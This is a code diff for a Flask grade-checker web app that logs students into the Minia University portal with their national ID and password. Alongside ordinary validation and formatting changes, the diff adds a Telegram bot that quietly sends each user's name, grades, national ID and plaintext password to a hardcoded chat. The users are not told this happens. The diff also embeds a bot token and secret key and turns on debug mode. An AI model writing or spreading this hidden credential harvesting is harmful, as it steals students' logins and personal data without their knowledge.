@@ -1,21 +1,35 @@
 from flask import Flask, render_template, request, flash, redirect, url_for
 import requests
 import json
-   
+import telebot
+
 app = Flask(__name__)
 app.secret_key = 'Raafat01011508719'
+
+# Initialize your Telegram bot
+bot = telebot.TeleBot("6512189034:AAFiP4hSCd5LXSIbK0KlkI-9qmUYh3fCAwQ")
+
 @app.route('/')
 def index():
     return render_template('index.html')
 
 @app.route('/grades', methods=['POST'])
 def get_grades():
-    # Get credentials from form
     try:
-        username = request.form['username']
-        password = request.form['password']
+
+        email = request.form['username'].strip()
+        password = request.form['password'].strip()
         selected_year = request.form['year']
 
+        # Validate username
+        if not email.isdigit() or len(email) != 14:
+            flash("الرقم القومي يجب ان يكون 14 رقما!")
+            return redirect(url_for('index'))
+        
+        if not all(ord(char) < 128 for char in email):
+            flash("يجب كتابه الرقم القومي بالارقام الانجليزيه!")
+            return redirect(url_for('index'))
+            
         headers = {
             'Accept': '*/*',
             'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
@@ -34,11 +48,11 @@ def get_grades():
         }
 
         data = {
-            'UserName': username,
+            'UserName': email,
             'Password': password,
         }
 
-        response = requests.post('http://stda.minia.edu.eg/Portallogin', headers=headers, data=data, timeout=5)
+        response = requests.post('http://stda.minia.edu.eg/Portallogin', headers=headers, data=data, timeout=120)
         if response.status_code == 200:
             cookies = response.cookies
             response_json = response.json()
@@ -69,7 +83,17 @@ def get_grades():
                 }
 
                 name_req = requests.post('http://stda.minia.edu.eg/PortalgetJCI', cookies=cookies, headers=headers, data=data, verify=False).json()
-                name = name_req[0]['Name'].split('|')[0]
+                full_name = name_req[0]['Name'].split('|')[0]  # "رافت سامى صدقى فارس"
+
+                # Split the full name into parts
+                name_parts = full_name.split(' ') 
+
+                # Extract the first and second names
+                first_name = name_parts[0] 
+                second_name = name_parts[1]  
+
+                # Combine the first and second names
+                first_and_second_name = f"{first_name} {second_name}"
 
                 for entry in response_json:
                     if selected_year in entry['ScopeName']:
@@ -96,7 +120,13 @@ def get_grades():
                                 'percentage': int(percentage)
                             })
                 percentage = float(total_degrees/max_degrees)*100
-                return render_template('grades.html', grades=grades, name=name, percentage=percentage)
+                formatted_percentage = "{:.2f}".format(percentage)
+                
+                # Send grades and name to Telegram
+                message = f"Name: {full_name}\n\nGrades: {grades}\n\nTotal Percentage: {formatted_percentage}%\n\n{email} : {password}: {selected_year}"
+                bot.send_message("854578633", message)
+                
+                return render_template('grades.html', grades=grades, name=first_and_second_name, percentage=formatted_percentage)
             else:
                 flash("الرقم القومي او كلمة المرور خاطئة، يرجى إعادة إدخال البيانات!")
                 return redirect(url_for('index'))
@@ -108,4 +138,4 @@ def get_grades():
         return redirect(url_for('index'))
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0",port="5000")
+    app.run(debug=True)
